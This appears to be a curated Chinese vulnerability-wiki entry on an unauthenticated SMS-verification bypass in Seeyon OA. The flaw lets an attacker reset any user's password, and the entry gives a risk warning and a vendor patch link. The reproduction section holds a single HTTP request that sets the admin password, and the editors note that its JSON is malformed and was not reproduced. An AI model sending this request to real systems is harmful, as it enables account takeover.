---
source: "Threekiii/Vulnerability-Wiki"
title: "致远Seeyon phoneCode/resetPassword短信验证绕过改密码"
product: "致远Seeyon"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "V5-G6/V8.1-SP2/V8.2声称，2023-08补丁171"
prerequisites: "未授权声称"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态"
review_date: "2026-10-02"
source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9C-OA-%E6%9C%AA%E6%8E%88%E6%9D%83%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E.md"
id: "vw-fd46b12a35fc40b47ea3d927"
entity_id: "ve-fd46b12a35fc40b47ea3d927"
schema_version: "1"
---

# 致远Seeyon phoneCode/resetPassword短信验证绕过改密码

## 条目说明

- 对象与具体问题：致远Seeyon；phoneCode/resetPassword短信验证绕过改密码
- 版本、配置及部署条件：V5-G6/V8.1-SP2/V8.2声称，2023-08补丁171
- 认证与权限前提：未授权声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- JSON admin后的引号是弯引号且分隔也损坏，无法直接解析
- 只列重置请求无验证码前序/成功响应/账号条件，任意用户范围需验证
- 厂商补丁直链良好；属于改变账号凭据的侵入式操作，应标风险

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

### 漏洞描述

致远互联专注于企业级管理软件领域，是一家集产品的设计、研发、销售及服务为一体高新技术企业。致远 Seeyon OA 存在短信验证码绕过重置密码漏洞，攻击者可以利用该漏洞修改任意用户密码。

参考链接：

- https://service.seeyon.com/patchtools/tp.html#/patchList?type=%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81&id=171

### 披露时间

```
2023.08
```

### 漏洞影响

```
V5-G6、V8.1-SP2、V8.2
```

### 漏洞复现

```http
POST /seeyon/rest/phoneLogin/phoneCode/resetPassword HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Content-Length: 45
Connection: close

{"loginName":"admin”,”password":"888888"}
```

> 请求长度说明：原资料 Content-Length 为 45；保留原始标头；其数值未据实际请求体重新计算或验证。

### 漏洞修复

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

https://service.seeyon.com/patchtools/tp.html#/patchList?type=%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81&id=171

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
